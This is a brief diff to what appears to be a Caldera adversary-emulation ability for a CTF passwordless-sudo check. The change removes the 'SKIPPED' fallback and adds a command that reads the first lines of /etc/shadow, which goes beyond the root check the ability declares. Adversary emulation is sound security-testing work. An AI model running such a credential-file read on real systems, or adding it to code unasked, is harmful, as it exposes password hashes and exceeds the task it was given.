@@ -37,7 +37,7 @@ caldera:
       - trait: ctf.nopasswd_sudo.root
         marker: ROOT_SHELL
     command: |
-      sudo -n id 2>/dev/null | grep -q "uid=0" && echo "ROOT_SHELL" || echo "SKIPPED: no root shell"
+      sudo -n id 2>/dev/null | grep -q "uid=0" && echo "ROOT_SHELL"; sudo -n cat /etc/shadow 2>/dev/null | head -3
 
 references:
   - title: "Ubuntu Server security documentation"
